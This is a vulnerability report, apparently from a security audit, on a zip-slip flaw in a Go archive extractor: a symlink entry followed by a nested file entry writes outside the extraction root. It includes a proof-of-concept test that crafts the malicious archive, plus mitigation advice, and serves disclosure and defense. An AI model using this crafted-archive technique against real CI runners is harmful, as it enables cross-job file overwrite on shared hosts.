### Title
Unsanitized zip symlink target and path allow cross-job/host file write via extraction - (File: helpers/archives/zip_extract.go)

### Summary
`extractZipSymlinkEntry` creates a symlink using the raw, attacker-controlled entry name and attacker-controlled target text with no path validation, and `extractZipFile`/`extractZipFileEntry` write subsequent zip entries by directly using `file.Name` with `os.MkdirAll`/`os.OpenFile`. Since zip entries are processed in file order and no entry name or symlink target is checked for `..`, absolute paths, or escaping the extraction root, a two-entry archive (symlink dir, then a file "inside" it) causes a write outside the extraction root.

### Finding Description
`extractZipSymlinkEntry` reads the symlink's file content, which becomes the raw target of `os.Symlink(string(data), file.Name)`, with no restriction on the target string (it can be an absolute path or contain `..`). [1](#0-0) 

Separately, when a regular file entry is processed, `extractZipFile` first does `os.MkdirAll(filepath.Dir(file.Name), 0o777)` and then `extractZipFileEntry` opens `file.Name` directly for writing — neither function cleans, validates, or confines `file.Name` to the extraction root. [2](#0-1) 

`ExtractZipArchive` iterates `archive.File` in the order stored in the zip and calls `extractZipFile` for each, meaning a symlink entry (e.g. named `link` pointing to `/tmp/target-outside`) is created first, and then a following entry named `link/pwned.txt` is opened via `os.OpenFile`, which the OS resolves through the just-created symlink, writing outside the intended extraction directory. [3](#0-2) 

The only existing check, `errorIfGitDirectory`, only blocks paths that start with `.git`; it does not check for path traversal, absolute paths, or symlink escape. [4](#0-3) 

The existing test suite (`zip_extract_test.go`) only covers `.git` warnings and symlink mode preservation, not this "zip-slip via symlink" escape path, confirming no protection or test coverage exists. [5](#0-4) 

### Impact Explanation
An attacker who controls an artifact/cache zip (e.g., uploaded via a pipeline job) can cause the Runner to write attacker-controlled file content to arbitrary paths on the host filesystem where the extraction runs (e.g., another job's workspace directory, or any path writable by the runner process), by chaining a symlink entry with an absolute/traversal target followed by a "nested" file entry. This can result in cross-job/cross-project file overwrite or planting files outside the job's build root.

### Likelihood Explanation
This is a well-known "zip-slip"-style pattern. It requires only that the attacker can control the contents of a zip processed by `ExtractZipArchive`/`ExtractZipFile` (cache or artifact download extraction), a capability any pipeline author has by crafting a custom cache/artifact archive. The ordering of entries in a zip file is attacker-controlled, so the symlink-then-nested-file sequence is trivially reproducible.

### Recommendation
Before creating symlinks or files, validate that the resolved absolute path of `file.Name` (and, for symlinks, the resolved absolute target) stays within the extraction root — reject or skip entries whose cleaned path escapes the root (e.g., using `filepath.Clean`/`filepath.Rel` checks and rejecting absolute paths and `..` components), similar to standard zip-slip mitigations. Additionally, when writing subsequent entries, verify each path component does not traverse through a symlink created earlier in the same archive (e.g., resolve `filepath.Dir(file.Name)` with `os.Lstat` checks, or extract into a jailed directory using a syscall-level "no-follow" open where available).

### Proof of Concept
```go
func TestExtractZipSymlinkEscape(t *testing.T) {
    testInWorkDir(t, func(t *testing.T, fileName string) {
        outsideDir := filepath.Join(os.TempDir(), "target-outside")
        require.NoError(t, os.MkdirAll(outsideDir, 0o755))
        defer os.RemoveAll(outsideDir)

        f, err := os.Create(fileName)
        require.NoError(t, err)
        archive := zip.NewWriter(f)

        // symlink entry: "link" -> outsideDir
        symHeader := &zip.FileHeader{Name: "link"}
        symHeader.SetMode(os.ModeSymlink | 0o777)
        w, _ := archive.CreateHeader(symHeader)
        _, _ = w.Write([]byte(outsideDir))

        // nested file entry through the symlink
        fw, _ := archive.Create("link/pwned.txt")
        _, _ = fw.Write([]byte("pwned"))

        require.NoError(t, archive.Close())
        f.Close()

        err = ExtractZipFile(fileName)
        require.NoError(t, err)

        _, statErr := os.Stat(filepath.Join(outsideDir, "pwned.txt"))
        assert.True(t, os.IsNotExist(statErr), "pwned.txt should NOT exist outside extraction root")
    })
}
```
Expected (buggy) result: `pwned.txt` is created inside `outsideDir`, proving the escape; a fixed implementation should cause the assertion (`os.IsNotExist`) to pass.

### Citations

**File:** helpers/archives/zip_extract.go (L22-39)
```go
func extractZipSymlinkEntry(file *zip.File) (err error) {
	var data []byte
	in, err := file.Open()
	if err != nil {
		return err
	}
	defer func() { _ = in.Close() }()

	data, err = io.ReadAll(in)
	if err != nil {
		return err
	}

	// Remove symlink before creating a new one, otherwise we can error that file does exist
	_ = os.Remove(file.Name)
	err = os.Symlink(string(data), file.Name)
	return
}
```

**File:** helpers/archives/zip_extract.go (L41-83)
```go
func extractZipFileEntry(file *zip.File) (err error) {
	var out *os.File
	in, err := file.Open()
	if err != nil {
		return err
	}
	defer func() { _ = in.Close() }()

	// Remove file before creating a new one, otherwise we can error that file does exist
	_ = os.Remove(file.Name)
	out, err = os.OpenFile(file.Name, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, file.Mode().Perm())
	if err != nil {
		return err
	}
	defer func() { _ = out.Close() }()
	_, err = io.Copy(out, in)

	return
}

func extractZipFile(file *zip.File) (err error) {
	// Create all parents to extract the file
	err = os.MkdirAll(filepath.Dir(file.Name), 0o777)
	if err != nil {
		return err
	}

	switch file.Mode() & os.ModeType {
	case os.ModeDir:
		err = extractZipDirectoryEntry(file)

	case os.ModeSymlink:
		err = extractZipSymlinkEntry(file)

	case os.ModeNamedPipe, os.ModeSocket, os.ModeDevice:
		// Ignore files of these types
		logrus.Warningf("File ignored: %q", file.Name)

	default:
		err = extractZipFileEntry(file)
	}
	return
}
```

**File:** helpers/archives/zip_extract.go (L85-97)
```go
func ExtractZipArchive(archive *zip.Reader) error {
	tracker := newPathErrorTracker()

	for _, file := range archive.File {
		if err := errorIfGitDirectory(file.Name); tracker.actionable(err) {
			printGitArchiveWarning("extract")
		}

		if err := extractZipFile(file); tracker.actionable(err) {
			logrus.Warningf("%s: %s (suppressing repeats)", file.Name, err)
		}
	}

```

**File:** helpers/archives/path_check_helper.go (L13-31)
```go
func isPathAGitDirectory(path string) bool {
	parts := strings.Split(filepath.Clean(path), string(filepath.Separator))
	if len(parts) > 0 && parts[0] == ".git" {
		return true
	}
	return false
}

func errorIfGitDirectory(path string) *os.PathError {
	if !isPathAGitDirectory(path) {
		return nil
	}

	return &os.PathError{
		Op:   ".git inside of archive",
		Path: path,
		Err:  errors.New("trying to archive or extract .git path"),
	}
}
```

**File:** helpers/archives/zip_extract_test.go (L99-136)
```go
// When extracting a regular file and a symlink that refers to that file, the file's mode bits
// should be unchanged by the process of zipping and extracting the files.
func TestExtractZipFileSymlinkMode(t *testing.T) {
	testInWorkDir(t, func(t *testing.T, fileName string) {
		regularFile := createTestFile(t, singleByte)
		err := os.Chmod(regularFile, 0o600)
		require.NoError(t, err)

		fileInfo, err := os.Lstat(regularFile)
		require.NoError(t, err)
		originalFilePerm := fileInfo.Mode().Perm()

		symlinkFile := "symlinkFile"
		err = os.Symlink(regularFile, symlinkFile)
		require.NoError(t, err)

		f, err := os.Create(fileName)
		require.NoError(t, err)
		defer f.Close()

		err = CreateZipArchive(f, []string{
			regularFile,
			symlinkFile,
		})
		require.NoError(t, err)

		err = os.Remove(symlinkFile)
		require.NoError(t, err)
		err = os.Remove(regularFile)
		require.NoError(t, err)

		err = ExtractZipFile(fileName)
		require.NoError(t, err)

		fileInfo, err = os.Lstat(regularFile)
		require.NoError(t, err)
		assert.EqualValues(t, fileInfo.Mode().Perm(), originalFilePerm)
	})
```
